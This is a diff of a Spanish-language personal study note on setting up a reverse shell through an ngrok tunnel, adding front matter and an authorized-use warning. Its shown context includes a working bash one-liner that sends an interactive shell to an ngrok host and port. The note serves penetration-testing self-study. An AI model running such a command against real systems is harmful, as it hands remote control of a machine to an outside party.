@@ -1,3 +1,15 @@
+---
+title: "3 - Reverse Shell con NGROK"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Lo primero será registrarse en ngrok:
 ![[Pasted image 20240919134820.png]]
 Y procedemos con la instalación:
@@ -26,3 +38,10 @@ bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15520 0>&1
 Y la recibimos:
 ![[Pasted image 20240919135116.png]]
 ![[Pasted image 20240919135104.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
